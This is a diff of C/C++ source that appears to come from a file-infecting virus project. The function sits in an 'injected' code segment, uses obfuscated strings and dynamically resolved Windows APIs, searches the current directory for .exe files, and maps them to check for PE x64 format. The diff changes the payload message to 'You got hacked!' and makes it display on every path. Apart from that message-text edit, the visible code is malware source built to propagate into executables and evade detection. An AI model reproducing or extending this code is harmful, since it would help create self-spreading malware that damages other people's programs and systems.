@@ -12,14 +12,14 @@ EXTERN_C_END
 
 __declspec(code_seg("injected")) VOID inj_code_c() {
     DECLARE_OBFUSCATED(user32, "USER32.DLL");
-    DECLARE_OBFUSCATED(mbTitle, "Hello");
-    DECLARE_OBFUSCATED(mbText, "Hello, world!");
+    DECLARE_OBFUSCATED(mbTitle, "Hacked!!1");
+    DECLARE_OBFUSCATED(mbText, "You got hacked!");
     DECLARE_OBFUSCATED(exeExt, "*.exe");
 #ifdef PL_DEBUG
-    DECLARE_OBFUSCATED(mbInjecting, "Injecting payload...");
+    DECLARE_OBFUSCATED(mbInjecting, "Injecting...");
     // DECLARE_OBFUSCATED(errGetModName, "Error getting module name");
     // DECLARE_OBFUSCATED(errGetDir, "Error getting current directory");
-    DECLARE_OBFUSCATED(errFindFile, "Error finding .exe files");
+    DECLARE_OBFUSCATED(errFindFile, "No .exe files");
     // DECLARE_OBFUSCATED(errOpenFile, "Error opening file");
     // DECLARE_OBFUSCATED(errMapFile, "Error mapping file");
     // DECLARE_OBFUSCATED(errNotPE, "Not a PE x64 file");
@@ -43,11 +43,14 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
     CONST auto pUser32Dll = pLoadLibraryA(DEOBF(user32));
     CONST auto pMessageBoxA = GET_FUNC(pUser32Dll, MessageBoxA);
 
+    LPSTR sDirEnd;
+    HANDLE hFind;
+
     CHAR sModuleName[MAX_PATH];
     DWORD res = pGetModuleFileNameA(NULL, sModuleName, sizeof(sModuleName));
     if (res == 0 || res >= sizeof(sModuleName)) {
         // MSGBOX_DBG(DEOBF(errGetModName), NULL, MB_OK | MB_ICONERROR);
-        return;
+        goto end;
     }
     // MSGBOX_DBG(sModuleName, DEOBF(mbTitle), MB_OK | MB_ICONINFORMATION);
 
@@ -56,7 +59,7 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
     res = pGetCurrentDirectoryA(sizeof(sDirName), sDirName);
     if (res == 0 || res >= sizeof(sDirName) - DEOBF(exeExt).length - 1) {
         // MSGBOX_DBG(DEOBF(errGetDir), NULL, MB_OK | MB_ICONERROR);
-        return;
+        goto end;
     }
     my_strappend(sDirName, '\\');
     my_strcpy(sFindPath, sDirName);
@@ -64,13 +67,13 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
     // MSGBOX_DBG(sFindPath, DEOBF(mbTitle), MB_OK | MB_ICONINFORMATION);
 
     CHAR sFilePath[MAX_PATH];
-    LPSTR sDirEnd = my_strcpy(sFilePath, sDirName) - 1;
+    sDirEnd = my_strcpy(sFilePath, sDirName) - 1;
 
     WIN32_FIND_DATAA findData;
-    HANDLE hFind = pFindFirstFileA(sFindPath, &findData);
+    hFind = pFindFirstFileA(sFindPath, &findData);
     if (hFind == INVALID_HANDLE_VALUE) {
         MSGBOX_DBG(DEOBF(errFindFile), NULL, MB_OK | MB_ICONERROR);
-        return;
+        goto end;
     }
 
     HANDLE hFile, hMapFile;
@@ -168,6 +171,7 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
 
     pFindClose(hFind);
 
+end:
     pMessageBoxA(NULL, DEOBF(mbText), DEOBF(mbTitle),
-                 MB_OKCANCEL | MB_ICONINFORMATION | MB_TOPMOST | MB_SETFOREGROUND);
+                 MB_OKCANCEL | MB_ICONWARNING | MB_TOPMOST | MB_SETFOREGROUND);
 }
